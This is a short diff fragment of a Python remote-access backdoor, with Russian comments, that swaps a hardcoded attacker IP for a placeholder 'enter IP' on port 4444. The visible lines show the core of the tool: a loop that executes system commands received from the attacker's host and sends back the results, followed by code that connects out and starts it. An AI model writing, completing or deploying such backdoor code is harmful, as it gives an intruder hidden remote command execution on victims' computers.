@@ -29,5 +29,5 @@ class Backdoor:
 			command_result = self.execute_system_command(command)
 			self.reliable_send(command_result)
 	
-my_backdoor = Backdoor("192.168.1.150", 4444) #ip хакера
+my_backdoor = Backdoor("ВВедите IP", 4444) #ip хакера
 my_backdoor.run()
